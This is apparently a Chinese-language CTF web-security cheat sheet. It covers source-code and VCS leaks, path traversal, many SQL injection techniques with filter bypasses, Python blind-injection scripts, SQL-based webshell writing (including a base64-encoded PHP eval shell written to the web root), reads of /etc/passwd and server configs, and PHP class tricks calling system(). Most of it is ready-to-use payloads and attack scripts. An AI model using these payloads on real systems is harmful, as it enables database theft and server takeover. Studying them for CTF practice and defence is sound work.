---
title: CTF-Web
date: 2024-04-09 11:19:30
updated: 2025-11-28 03:15:33
tags:
  - Web
  - CTF
---
## 子域名爆破

360quake 使用空间搜索引擎--->360quake 搜索语法--->domain="ctf.show" 可以搜索出子【域名

```bash
Oneforall
python3 oneforall.py --target example.com run
python3 oneforall.py --targets ./example.txt run
```

## HTTP请求走私

```http
Content-Length: 9
Content-Length: 9

num=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544791-99fbcd46-c9f2-468a-86df-0f43c304fd11.png)

[关于http走私学习](https://xz.aliyun.com/t/6654#toc-4)

[http走私解法](https://blog.csdn.net/qq_46918279/article/details/120351352?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22120351352%22%2C%22source%22%3A%22BigColaXD%22%7D&fromshare=blogdetail)

## 目录遍历漏洞

  

**"./"：代表目前所在的目录。**

  

**" . ./"代表上一层目录。**

  

**"/"：代表根目录。**

  

> 如果我们在文件系统中使用 `cd ..`，它会让你退后一步;
> 
> 但是，如果你做`cd .`，它会留在当前目录中。
> 
> 同样，如果我们尝试 `/etc/passwd/..`结果是 `/etc/`
> 
> 现在，如果我们尝试 `/etc/passwd/.`，结果将是 `/etc/passwd`，因为 dot 指的是当前目录。

## 源码泄漏

  

[常见的Web源码泄漏及其利用](https://zhuanlan.zhihu.com/p/110389472)

```python
御剑

dirsearch:
python dirsearch.py -u 网址 -e*

wfuzz:
wfuzz -w 字典 URL//FUZZ

dumpall:
.git/.svn/.DS_Store泄漏和目录列出
# 示例
dumpall -u http://example.com/.git/
dumpall -u http://example.com/.svn/
dumpall -u http://example.com/.DS_Store
dumpall -u http://example.com/
```

域名解析记录查询

[在线域名解析记录检测-在线Nslookup域名解析查询工具](http://www.jsons.cn/nslookup/)

### 备份文件泄露

  

index.php

index.php.swp  
index.php.bak  
backup.sql //sql备份文件  
robots.txt  
index.phps  
www.zip  
/db/db.mdb //mdb文件是早期asp+access构架的数据库文件

苹果 -> .DS\_store

谷歌爬取 -> 想到爬虫说明robots.txt

版本控制 -> ● .git ● SVN（Subversion） ● CVS（Concurrent Versions System)

  

-   .rar
-   .zip
-   .7z
-   .tar.gz
-   .bak
-   .txt
-   .old
-   .temp

  

#### 文本备份文件

  

```plain
在Linux系统下会使用诸如vim或gedit等文本编辑器，当编辑器崩溃或因异常退出时会自动备份当前文件；或将实现某功能后的代码备份后再进行后续开发工作。

可能的备份文件（index.php为例）：

.index.php.swp
.index.php.swo
index.php~
index.php.bak
index.php.txt
index.php.old
...
```

  

vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个**.index.php.swp**文件，我们可以使用vim -r .index.php.swp恢复文件

  

> 在使用vim编辑过程中如果异常退出编辑，比如不小心碰到了电源键。但是你编辑的东西不会丢失而是系统帮你生成一个**.swp**的缓存文件(格式为.文件名.swp)第二次意外退出时为**.swo**，第三次为**.swn**，所以根据题目描述就可以访问.xx.swp的文件(注意最前面多个.)。  
> 恢复文件内容的方法:执行“vim 文件名”命令的目录下创建一个名字相同的文件夹“touch 文件名”“cat 文件名（此时为空）”再使用“vim -r 文件名”命令。然后"cat 文件名"就能看见被缓存的内容了

  

#### 整站源码备份文件

  

```plain
会将整站源码打包，然后放在网站的根目录下，这时，只要找到这个压缩包就能开始进行源码审计了。

常见的整站备份文件名：

www
wwwdata
wwwroot
web
webroot
backup
dist
...

各种压缩文件后缀名：

.zip
.tar
.tar.gz
.7z
.rar
...

还可利用其他可能泄露目录结构或文件名的敏感文件来获取备份文件的位置，如“.xx_xxx”
```

  

### Git泄露

(版本控制)

web在升级和维护过程中，会对站点文件进行修改，就需要对网站整站或其中一部分进行备份。发布代码的时候，如果没有删除.git目录，就直接发布到服务器，攻击者通过它来恢复源代码。备份文件被放在到 web 服务器可访问的目录下

  

```plain
python GitHack.py http://www.openssl.org/.git/
```

  

#### 特征搜索

  

某个网站存在某个明显特征字符串的时候  
就有可能通过GitHub的搜索功能来搜索到该项目

  

#### .git

  

每个git项目的根目录下都存在一个.git文件夹，作用就是存储项目的相关信息  
工具：GitHack和源码

  

##### 分析源码

  

首先在本地建立一个git工程并初始化，然后再commit一次  
进入.git目录下，看看目录中文件  
确定commit对象，查看对象  
输入存在“.git”目录中的url  
接着查看HEAD文件获取分支的位置，然后得到分支的hash值  
得到hash值后本地初始化一个git，接着通过parseCommit获取全部对象  
最后使用reset重设分支，成功将项目重新建立在本地

  

##### 文件

  

关键的文件（一部分）：  
HEAD：标记当前git在哪个分支中。  
refs：标记该项目里的每个分支指向的commit。  
objects：git本地仓库存储的所有对象。

  

git的对象：  
commit：标记一个项目的一次提交记录。  
tree：标记一个项目的目录或者子目录。  
blob：标记一个项目的文件。  
tag：命名一次提交。

  

##### 自定义函数

  

```plain
（1）parseCommit函数：

作用：下载commit对象，将其parent一并下载

代码：

function parseCommit {
        echo parseCommit $1
        downloadBlob $1
        tree=$(git cat-file -p $1| sed -n '1p' | awk '{print $2}')
        parseTree $tree
        parent=$(git cat-file -p $1 | sed -n '2p' | awk '{print $2}')
        [ ${#parent} -eq 40 ] && parseCommit $parent
}
-------------------------------------------------------------------
（2）parseTree函数：

作用：下载tree对象，并列出tree下的所有对象，分类为tree或者blob后处理

代码：

function parseTree {
        echo parseTree $1
        downloadBlob $1
        while read line
        do
        type=$(echo $line | awk '{print $2}')
        hash=$(echo $line | awk '{print $3}')
        [ "$type" = "tree" ] && parseTree $hash || downloadBlob $hash
        done < <(git cat-file -p $1)
}
-------------------------------------------------------------------
（3）downloadBlob函数：

作用：下载与hash对应的文件

function downloadBlob {
        echo downloadBlob $1
        mkdir -p ${1:0:2}
        cd $_
        wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
        cd ..
}
```

  

### svn泄露

(版本控制)

在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。  
网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn/entries文件，获取到服务器源码。

  

```plain
Seay-Svn:
http://www.vuln.cn/wp-content/uploads/2015/10/Seay-Svn.rar
--------------------------------------------------------------------
dvcs-ripper:
https://github.com/kost/dvcs-ripper
Rip Web可访问（分布式）版本控制系统：SVN，GIT，Mercurial/hg，bzr，...
即使目录浏览关闭，它也可以翻录存储库。
确保将自己置于要下载/克隆存储库的空目录中。
```

  

### hg、CVS、Bazaar/bzr源码泄漏

  

```plain
dvcs-ripper:
https://github.com/kost/dvcs-ripper

rip-hg.pl -v -u http://www.example.com/.hg/
rip-cvs.pl -v -u http://www.example.com/CVS/	(版本控制)
rip-bzr.pl -v -u http://www.example.com/.bzr/

Rip Web可访问（分布式）版本控制系统：SVN，GIT，Mercurial/hg，bzr，...
即使目录浏览关闭，它也可以翻录存储库。
确保将自己置于要下载/克隆存储库的空目录中。
```

  

### WEB-INF/web.xml泄露

  

WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。

---

WEB-INF主要包含一下文件或目录：

  

**/WEB-INF/web.xml**：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。

  

**/WEB-INF/classes/**：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中

  

**/WEB-INF/lib/**：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件

  

**/WEB-INF/src/**：源码目录，按照包名结构放置各个java文件。

  

**/WEB-INF/database.properties**：数据库配置文件

---

**漏洞成因：**通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。

  

一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/\* { deny all; } 或者return 404; 或者其他！

---

**漏洞检测以及利用方法：**通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。

  

```html
POST /Download?filename=WEB-INF/web.xml
```

![image-20231221194119153.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712662042221-4f4e5194-4d99-4299-a6ef-0949a37eec26.png)

尝试下载classes下的FlagController.class文件

  

```plain
payload：POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

  

### DS\_Store 文件泄露

  

.DS\_Store是Mac下Finder用来保存如何展示文件/文件夹 的数据文件（即文件夹的显示属性的，和比文件图标的摆放位置），每个文件夹下对应一个

  

把代码上传的时候，安全正确的操作应该把 .DS\_Store 文件删除,如果未删除，.DS\_Store将会上传部署到服务器，可能造成文件泄漏（目录结构、备份文件、源代码文件）

  

```plain
ds_store_exp:
是一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。
下载地址：
https://github.com/lijiejie/ds_store_exp
```

  

### 利用漏洞泄露

  

结合任意文件包含漏洞或者任意文件存在下载漏洞

  

就可能下载到源码，并对其进行审计

  

[任意文件读取/下载漏洞总结](https://blog.csdn.net/qq_43531669/article/details/116865660?ops_request_misc=%7B%22request%5Fid%22%3A%22170316314016800188585873%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170316314016800188585873&biz_id=0&spm=1018.2226.3001.4187)

  

```plain
读文件的函数:
fopen
fread
include
readfile
file

index.php?f=../../../../../../etc/passwd
index.php?f=../index.php
index.php?f=ﬁle:///etc/passwd
当参数 f 的参数值为php文件时，
若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞
```
---

## sql注入

先尝试联合注入

```plain
-1' union select 1,2,3 --+

id=(select*from(select(sleep(10)))a)

```

### 过滤

查看报错时，near之后的句子开头存在错误或者之前存在错误，发现过滤

[information\_schema过滤与无列名注入](https://blog.csdn.net/weixin_49656607/article/details/119988304)

```sql
#or、and、=、#、*
or -> OR
and -> &&
= -> like
# -> ||'1
# -> or'1
# ->'
'!=!(1)!=!'1  (True !=! True !=! True) == True
'!=!(0)!=!'1  (True !=! False !=! True) == False
# ->  and '1'='1
# -> --+ / --%0c
# -> %23
* -> %0d
or'1'='1'--%0c
-1'or(id=26)and'1			//知道id查id，and的优先级比or高
-1'or%0cusername%0clike%0c'flag  //知道username查username

schema()
database()
@@version
current_user
information()
@@DBNAME
DATABASE_NAME

#大写绕过

#双写
1' order bbyy 1# //by被过滤
1' oorrder bbyy 1# //or、by都被过滤
-1' ununionion selselectect 1,2,database()# //union、select被过滤
-1' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#  
//union、select、or、from、where被过滤

'union/**/select/**/(select/**/database())'
'union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='test')'
'union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag')'
'union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)'

#空格

%20、%09、%0a、\n、%0b、%0c、%0d、%a0、%00、``、/**/、 /!select/ 、()、+、–%0a（可以1-256都跑一遍）
//%09需要php环境，%0a为\n

union(select(select(group_concat(password))from(ctfshow_user)),1,2)%23
/!select/为mysql独有	//常见用法为/!50727select 1/，即当版本号小于等于50727时，执行select 1

#username !== 'flag'绕过
##将flag变为FLAG绕过
 0' union select UPPER(username),password from ctfshow_user2 where username = 'flag
##替换
replace(username,'f','g')

#where、"、'被ban
##join、16进制绕过		0x6325=c%
ctfshow_user as a inner join ctfshow_user as b on b.pass like 0x6325
// 字符串转十六进制脚本：
// def string_to_hex(s):
//     hex_string = ''.join(format(ord(c), '02x') for c in s)
//     return hex_string

#数字被ban
true=1、concat(1,1)=11
chr(true+...)	//加号会被视为空格，因此要url编码
```
```sql
false														0
true														1
true+true												2
floor(pi())											3
ceil(pi())											4
floor(pi())+true								5
floor(pi())+floor(pi())					6
floor(pi())+ceil(pi())					7
ceil(pi())+ceil(pi())						8
floor(pi())*floor(pi())					9
floor(pi())*floor(pi())+true		10
```

### 联合注入

```sql
查询当前数据库名:
union select 1,database()
查询数据库版本:
union select 1,version()
查询所有数据库库名:
union select 1,group_concat(schema_name) from information_schema.schemata
查询某数据库所有表名:
union select 1,group_concat(table_name) from information_schema.tables where table_schema='数据库名'
查询某数据库某表所有列名(字段名):
union select 1,group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'
查询某数据库某表某列(字段)所有记录:
union select 1,group_concat(列名) from 数据库名.表名
```

  

### 报错注入

  

```sql
查询数据库版本:
union select updatexml(1, concat(0x7e, version(),0x7e),1)
查询所有数据库库名:
union select updatexml(1, concat(0x7e, (select group_concat(schema_name) from information_schema.schemata),0x7e),1)
查询某数据库所有表名:
union select updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),0x7e),1)
查询某数据库某表所有列名(字段名):
union select updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),0x7e),1)
查询某数据库某表某列(字段)所有记录:
union select updatexml(1, concat(0x7e, (select group_concat(列名) from 数据库名.表名),0x7e),1)
查询某数据库某表某列(字段)第x个记录:
union select updatexml(1, concat(0x7e, (select 列名 from 数据库名.表名 LIMIT x,1),0x7e),1) //x从0开始
```

  

```sql
database被ban了，得先想办法注出库名.||没有过滤，可以去查一个不存在的表来爆出库名
1'||(select *from aa)#	或者	1'|a()%23

union被ban，但是extractvalue()没有ban，可以进行报错注入,用like代替等号
1'||extractvalue(0,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema like 'sqlsql'),0x7e))#

column被ban，用join去爆字段
-1'||extractvalue(1,concat(0x7e,(select *from (select * from 表名 as a join 表名 as b)as c)))#
1' || extractvalue(1,concat(0x07, (select * from(select * from output b join output c using(data))a), 0x07))#
as 可省略
```
```sql
sqladmin'or'1'or'1 //Login Success!!
admin'or(注入)or'1 //Login Success!!
'or(updatexml(1,concat(0x7e,database(),0x7e),1))#		//空格被过滤用()
'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or'1
admin'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))or'1
admin'or(updatexml(1,concat(0x7e,(select(right(group_concat(password),25))from(H4rDsq1)),0x7e),1))or'1 //用了right函数从右边开始显示
select(mid(group_concat(password),20,20)) //mid函数
```

### 布尔盲注

sqlserver

![QQ_1723899345581.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1723899358521-bd584ad2-19a3-4c46-8d83-c0432fb98e2e.png)

mysql

exp(710-(user()like'a%')) exp(710-0)报错 exp(710-1)不报错 函数exp

2/0无显 2/1有显

\-1/case when mid(user(),1,1)!='a' then exp(999) else exp(1) end-

select from\_base64("PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b") into outfile '/var/www/html/1.php

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1723898292709-d6e19012-8120-42eb-9141-5e6cef0707b7.png)![QQ_1723898329118.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1723898332467-6f30a0f1-f572-45df-98a3-fcb80504b313.png)

  

![QQ_1723898594278.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1723898602235-6f6cd393-31cc-46d1-831e-aa31ef5f2854.png)

```sql
and left(database(),x)='数据库名前x位'
尝试某数据库第x个表名: 
and left((select table_name from information_schema.tables where table_schema='数据库名' LIMIT x,1),y)='表名前y位' //x从0开始
尝试某数据库某表第x个列名:
and left((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' LIMIT x,1),y)='列名前y位' //x从0开始
尝试某数据库某表某列的第x个记录:
and left((select 列名 from 数据库名.表名 LIMIT x,1),y)='记录前y位' //x从0开始
```
```python
1'and (select password from ctfshow_user4 where username='flag') like '{}%'--+".format(flag+j)
if(1=1,1,2)
if(ascii(substr((select(flag)from(flag)),{},1))={},1,2)".format(i, ord(j))
1^(ascii(substr((select(flag)from(flag))," + str(i) + ",1))=" + str(j) +")//过滤了空格
```
```python
import requests
import time

flag = ''
for i in range(1, 50):
    for j in '-{abcdefghijklmnopqrstuvwxyz0123456789}':
        url = "http://eac65d5e-7894-4e1e-835e-3bd9eb2bd74e.node4.buuoj.cn:81/index.php"
        sqls = "if(ascii(substr((select(flag)from(flag)),{},1))={},1,2)".format(i, ord(j))
        data = {"id": sqls}
        c = requests.post(url=url, data=data, timeout=None)
        if 'Hello' in c.text:
            flag += j
            print(flag)
            break
        time.sleep(0.05)
```

### 时间盲注

  

```sql
and if(left(database(),x)='数据库名前x位',sleep(3),0)
尝试某数据库第x个表名: 
and if(left((select table_name from information_schema.tables where table_schema='数据库名' LIMIT x,1),y)='表名前y位',sleep(3),0) //x从0开始
尝试某数据库某表第x个列名:
and if(left((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' LIMIT x,1),y)='列名前y位',sleep(3),0) //x从0开始
尝试某数据库某表某列的第x个记录:
and if(left((select 列名 from 数据库名.表名 LIMIT x,1),y)='记录前y位',sleep(3),0) //x从0开始
```
```python
import requests
import time
url = "http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1,50):
    for j in dict:
        payload = f"?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),{i},1)=\"{j}\",sleep(5),0)--+"
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end-start > 4.9:
            flag += j
            print(flag)
            break

```

  

### Quine注入

  

[https://www.shysecurity.com/post/20140705-SQLi-Quine](https://www.shysecurity.com/post/20140705-SQLi-Quine)

  

[从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253570)

  

[https://www.cnblogs.com/zhengna/p/15917521.html](https://www.cnblogs.com/zhengna/p/15917521.html)

  

```sql
mysql> 
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');

+-------------------------------------------------------------------replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') 
+-------------------------------------------------------------------replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') 
+-------------------------------------------------------------------
1 row in set (0.00 sec)
```

  

```php
例题：
  //黑名单
  function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
}
//sql查询语句
$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
 
if (!$row) {
    alertMes("something wrong",'index.php');
}
  //强等于password才能得到flag
if ($row['password'] === $password) {
    die($FLAG);
}else {
    alertMes("wrong password",'index.php');
}
-------------------------------------------------------------------
  除了正常逻辑的密码相同会产生相等，如果我们的输入与最后的结果相等，那么一样可以绕过验证。这种技术就是Quine
解法2(Quine):
username=admin&password=1'union/**/select/**/replace(replace('1"union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
#char -> chr、0x
#CHAR(34)是双引号，CHAR(39)是单引号，如果CHAR被禁了0x22和0x27是一样的效果
```

  

```python
解法1(sql注入):
  对于sql语句我们可以使用 like+%模糊匹配绕过。
SELECT password FROM users WHERE username='admin' and password='$password'
$password 可为 'or/**/password/**/like/**/'e%'#
放进去就是：
SELECT password FROM users WHERE username='admin' and password=''or/**/password/**/like/**/'e%'#'
  意思就是password 以e开头 ，如果是，则绕过第一个if，但是第二个if要求$password完全相同，否则弹出"wrong password"的字样。
所以我们可以尝试直接爆破密码。
  
import requests
import time
url='http://1.14.71.254:28130/'
pw="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password=''
 
for i in range(1,66):
    for j in pw:
        payload= "'/**/or/**/password/**/like/**/'{}%'#".format(password+j)
        r = requests.post(url,data = {'username':'admin','password':payload})
        time.sleep(0.1)                   #太快会提前退出
        if "wrong password" in r.text:    #如果部分密码正确
            password+=j
            print(password)
            break
```

  

### sqlmap

  

```sql
python sqlmap.py -u "网址:端口/?注入点=1" --current-db //当前数据库
sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs //所有数据库
爆破某数据库的所有表名:
python sqlmap.py -u "网址:端口/?注入点=1" -D 数据库名 --tables
爆破某数据库某表的所有列名(字段名):
python sqlmap.py -u "网址:端口/?注入点=1" -D 数据库名 -T 表名 --columns
爆破某数据库某表某列(字段)的所有记录:
python sqlmap.py -u "网址:端口/?注入点=1" -D 数据库名 -T 表名 -C 列名(字段名) --dump

-p id //指定参数“id”
```

  

```sql
1'or 1=1#
1'or(1)or'1
1'group by 1#

1'union select 1,database(),3 #

1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='geek' #

1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1'#

1'union select 1,group_concat(id,'~',username,'~',password),3 from l0ve1ysq1#
```

### SQL GETSHELL

> MySQL GETSHELL条件和原理  
> 条件： root权限 知道网站根目录绝对路径 secure\_file\_priv为空或指定目录（@@secure\_file\_priv参数可以其值）  
> gpc关闭  
> 原理：  
> 写入webshell，通过参数执行系统命令，结束后删除webshell
> 
>   
> 
> sqlserver getshell条件和原理  
> 条件：  
> 支持外连 有sa权限  
> 原理：  
> 开启xp\_cmd扩展执行系统命令

```html
读写文件
?id=-1)))))) union select load_file('/etc/passwd'),2%23
读取nginx配置文件，寻找网站根目录
?id=-1)))))) union select load_file('/etc/nginx/nginx.conf'),2%23
读取首页
?id=-1)))))) union select load_file('/var/www/html/index.php'),2%23
写入php探针
?id=-1)))))) union select '<?php phpinfo();?>',2 into outfile '/var/www/html/info.php'%23
访问测试
http://node6.anna.nssctf.cn:28413/info.php
写入webshell
?id=-1)))))) union select '<?php eval($_POST["cc"]);?>',2 into outfile '/var/www/html/cc.php'%23
蚁剑连接
http://node6.anna.nssctf.cn:28413/cc.php 密码cc
```
```php
#引号绕过
#因为现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有引号的语句呢？
load_file('c:/boot.ini') ==> load_file(char(99,58,47,98,111,111,116,46,105,110,105))

#load_file()还有一些常用的读取敏感信息方法
/etc/httpd/conf/httpd.conf				#查看linux APACHE虚拟主机配置文
/usr/local/apche/conf/httpd.conf  #查看linux APACHE虚拟主机配置文件
c:\Program Files\Apache Group\Apache\conf\httpd.conf	#查看WINDOWS系统apache文件
C:\apache\conf\httpd.conf  				#查看WINDOWS系统apache文件
c:/Resin-3.0.14/conf/resin.conf   #查看jsp开发的网站 resin文件配置信息.
```

### union select特性

```sql
[GXYCTF2019]BabySQli
1'or 1=1# //被过滤
过滤了or、=、(、)、order
本道题目的逻辑是这样的，先判断其用户名是否正确，如果正确的话就判断密码，否则就会报错。
我们可以使用union select的特性——临时打印一张虚拟的表

1'group by 3#	//3个字段 猜测 id,username,password
mysql在union联合查询不存在的数据时会自动构建虚拟数据，一般数据要么明文，要么MD5（password一般md5加密）；
可以在用户名查询不存在的密码，来生成一个虚拟的密码，然而这个密码是我们可控的，就可以成功登录了

local test：	
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.01 sec)

mysql> select * from users where username='2' union select 1,'admin',5 ;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | 5        |			当我第一段查询不存在时，直接显示联合查询中的虚拟数据
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where username='admin' union select 1,'admin',5 ;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
|  1 | admin    | 5        |			第一段查询数据存在时，结果集先返回存在的数据
+----+----------+----------+
2 rows in set (0.00 sec)

mysql>

admin存在 猜测要登入
密码123经过md5 32进制加密得到 202cb962ac59075b964b07152d234b70
构造payload 
name=1'+union+select+1,'admin','202cb962ac59075b964b07152d234b70'#&pw=123  
name=1'+union+select+1,'admin','827ccb0eea8a706c4c34a16891f84e7b'#&pw=12345  
//12345加密后为	827ccb0eea8a706c4c34a16891f84e7b
name如果不等于admin才会往后查询，等于admin就不会查询后面了；
```

### handler堆叠注入

```sql
mysql数据库中可以使用handler语句读取表中的数据
handler 要读取的表名 open (as 别名);
handler 列名 read next;	
# FIRST: 获取第一行（索引最小的一行）
# NEXT: 获取下一行
# PREV: 获取上一行
# LAST: 获取最后一行（索引最大的一行)
handler 名 close;

尝试过输入select发现黑名单
preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);

发现可以堆叠注入
-1';show databases;%23
-1';show tables;%23		//FlagHere、words
-1';show columns from`FlagHere`;%23 
发现有列名flag但是show不能显示具体的flag
-1';handler FlagHere open;handler FlagHere read first;handler FlagHere read next;handler FlagHere close;%23 

若rename、alter没有被过滤可以将FlagHere表改成words表,
然后使用alter table将FlagHere表中的flag列名修改为words中的id列名,
然后通过原本的查询将flag查询出来,具体payload如下
?id=1';rename table words to word;rename table FlagHere to words;alter table words change flag id varchar(100);show tables;
?id=1' or '1'='1      //此时变成"id"的"flag"的值不是1
```
---

## HTTP

  

```http
referer: https://Sycsecret.buuoj.cn   //从哪跳转
X-Forwarded-For:127.0.0.1   //本地访问
client-ip: 127.0.0.1	//本地访问
via: Clash.win //代理服务器地址
user-agent: Chrome //浏览器
Cookie：user=1    //一般为管理员身份，guest身份为0
```
---
```plain
curl -I -X OPTIONS http://node4.anna.nssctf.cn:28875/index.php
//扫出来了PUT
-I参数:向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
-x参数:指定 HTTP 请求的代理。
PUT请求，如果不存在这个路径下的文件，将会创建，如果存在，会执行覆盖操作
因为需要指定他的api接口，不能是自动指向，所以要加上index.php
```

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661543469-653257af-d44f-4651-9935-222e2c74c9a0.png)

---

## PHP特性

### php中代码开始标志类型

[php中代码开始标志类型(,,,<% %>,<%= %>)](https://blog.csdn.net/hsd2012/article/details/51194554?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-51194554-blog-100028185.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-51194554-blog-100028185.pc_relevant_vip_default&utm_relevant_index=3)

### 三目运算符的理解+变量覆盖

[php函数的传值与传址(引用)详解-php手册-PHP中文网](https://www.php.cn/php-notebook-172859.html)

[php三元运算符与if的详解-php教程-PHP中文网](https://www.php.cn/php-weizijiaocheng-383293.html)

```php
$_GET?$_GET=&$_POST:'flag';	//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

第一行，GET被设置，就可以用POST覆盖GET的值。
中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，
第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它

<?php
include('flag.php');
if($_GET){
$_GET=&$_POST;//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地
址)
}else{
"flag";
}
if($_GET['flag']=='flag'){
$_GET=&$_COOKIE;
}else{
'flag';
}
11所以我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag
中间的代码没有作用，因为我们不提交 flag 参数
  
payload:get：1=1 post：HTTP_FLAG=flag
```

### 运算符

#### and与&&

```php
<?php
$a=true and false and false;
var_dump($a);  返回true

$a=true && false && false;
var_dump($a);  返回false
```

#### 优先级

php运算符优先级 ||优先级低于&&

```php
<?php
if(false && false || true){   //也就是(flase || true)
    echo 666;
}
//输出结果：666
```

  

### php原生类

[Php原生类总结 - 先知社区](https://xz.aliyun.com/t/13785?time__1311=mqmxnQKGqQwx9DBqDTeeqBKdwlK3e4G8QeD)

```php
PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。
$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类
$instance = $class->newInstanceArgs($args); // 相当于实例化ctfshow类

echo new ReflectionClass('类名');
echo new ReflectionMethod(system('tac fl36dg.txt'));
echo new Exception(system('tac fl36dg.txt'));
